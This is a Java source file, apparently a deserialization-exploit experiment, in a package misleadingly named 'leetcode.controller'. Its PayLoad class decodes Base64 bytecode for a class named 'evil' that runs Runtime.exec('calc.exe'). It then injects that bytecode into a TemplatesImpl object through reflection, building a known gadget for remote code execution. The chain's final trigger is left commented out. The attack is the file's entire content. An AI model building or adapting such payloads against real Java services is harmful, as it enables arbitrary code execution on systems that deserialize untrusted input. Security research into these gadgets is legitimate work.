package net.selte.leetcode.controller;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;

//import org.apache.commons.beanutils.BeanComparator;


/**
 * @author rt
 * Copyright (c) 2023 by rt
 * All rights reserved.
 */
public class PayLoad {
	public static byte[] serialize(Object o) throws Exception {
		ByteArrayOutputStream barr = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(barr);
		oos.writeObject(o);
		return barr.toByteArray();
	}

	public static void unserialize(byte[] barr) throws Exception {
		ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr));
		ois.readObject();
	}

	public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
		Field field = obj.getClass().getDeclaredField(fieldName);
		field.setAccessible(true);
		field.set(obj, value);
	}

	public static void main(String[] args) throws Exception {
		byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT");
		TemplatesImpl obj = new TemplatesImpl();
		setFieldValue(obj, "_bytecodes", new byte[][]{code});
		setFieldValue(obj, "_name", "Arsene.Tang");
		setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
//

	}
}
